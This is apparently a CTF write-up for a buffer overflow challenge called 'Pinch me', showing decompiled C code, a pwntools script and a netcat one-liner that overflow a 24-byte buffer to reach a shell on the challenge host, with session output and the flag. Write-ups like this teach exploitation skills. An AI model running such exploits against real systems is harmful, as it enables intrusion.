Pinch me was the 2nd BOF challenge.

Here is the vuln() function containing the vulnerable code:

```c
void vuln(void)

{
  char local_28 [24];
  int local_10;
  int local_c;
  
  local_c = 0x1234567;
  local_10 = -0x76543211;
  puts("Is this a real life, or is it just a fanta sea?");
  puts("Am I dreaming?");
  fgets(local_28,100,stdin);
  if (local_10 == 0x1337c0de) {
    system("/bin/sh");
  }
  else {
    if (local_c == 0x1234567) {
      puts("Pinch me!");
    }
    else {
      puts("Pinch me harder!");
    }
  }
  return;
}
```

We note that the size of the `local_28` buffer is 24 while 100 bytes were allogated (see `fgets(local_28,100,stdin)`). If we input more than 24 bytes they will spillover into `local_10`. This is fine since we want to overwrite `local_10` with `0x1337c0de`.

The following payload will do:

```py
from pwn import *

HOST = 'dctf1-chall-pinch-me.westeurope.azurecontainer.io'
PORT = 7480

sh = remote(HOST,PORT)

sh.recv()

payload = 'A'* 24
payload += p64(0x1337c0de)

sh.sendline(payload)
sh.interactive()
```

Here is the result of running the script:

```console
root@osboxes:~/Downloads# python pinch_me.py 
[+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done
[*] Switching to interactive mode
$ whoami
pilot
$ ls
flag.txt
pinch_me
startService.sh
$ cat flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
```

The flag is **dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}**.

The below one-liner also did the job:

```console
root@osboxes:~/Downloads# (python -c "import pwn; print 'A'*24 + pwn.p64(0x000000001337c0de)"; cat) | nc dctf1-chall-pinch-me.westeurope.azurecontainer.io 7480
Is this a real life, or is it just a fanta sea?
Am I dreaming?
whoami
pilot
id
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
ls
flag.txt
pinch_me
startService.sh
cat flag.txt
dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}
```
